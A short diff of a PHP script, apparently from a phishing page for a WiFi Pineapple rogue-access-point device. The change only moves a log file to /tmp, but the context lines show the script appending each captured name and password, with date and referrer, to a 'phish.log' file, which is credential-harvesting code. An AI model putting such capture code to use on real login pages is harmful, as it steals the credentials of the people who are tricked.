@@ -9,7 +9,7 @@ if (isset($_POST['name']) && !empty($_POST['name'])) {
 
         $content = $today . "  --  " . $ref . "  --  " . $nam . "  --  " . $pas;
 
-        $filed = @fopen("/pineapple/logs/phish.log", "a+");
+        $filed = @fopen("/tmp/pineapple-phish.log", "a+");
         @fwrite($filed, "$content\n");
         @fclose($filed);
 }
